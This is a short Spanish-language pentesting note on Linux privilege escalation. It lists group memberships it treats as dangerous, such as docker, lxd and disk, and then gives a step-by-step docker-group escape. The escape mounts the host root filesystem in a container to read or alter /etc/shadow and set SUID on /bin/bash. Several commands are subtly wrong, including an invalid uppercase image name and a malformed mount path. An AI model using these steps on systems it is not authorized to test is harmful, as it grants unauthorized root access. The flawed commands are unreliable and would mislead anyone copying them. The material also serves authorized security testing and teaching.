Si con el comando `id` vemos que estamos en algun grupo especial, puede ser factible una escalada de privilegios. Estos son los grupos mas peligrosos:

```
docker
adm
sudo
wheel
lxd
libvirt
kvm
disk
input
video
render
lpadmin
tty
```

Este es un ejemplo de una escalada estando dentro del grupo docker:

1) Podemos crear una imagen de Ubuntu por ejemplo.
```bash
docker pull Ubuntu:latest
```

2) Desplegamos un contenedor con una _montura de la raiz del SO_, por lo que, cualquier cambio que hagamos dentro del contenedor, se va a hacer en la maquina real:
```bash
docker run -it --rm -dit -v /:mnt/root --name privesc Ubuntu:latest
```

_-v /:/mnt/root_ --> Toda la raiz del equipo la monta en _/mnt/root_. 

3) Nos metemos en el contenedor:
```bash
docker exec -it privesc bash
```

4) Nos metemos en `/mnt/root`

5) Ya dentro de la raiz de la montura, estamos dentro de la maquina real con todos los permisos, podemos listar _/etc/shadow_, modificarlo, incluso darle _SUID_ a /bin/bash y ejecutar el comando `bash -p` posteriormente fuera del contenedor.
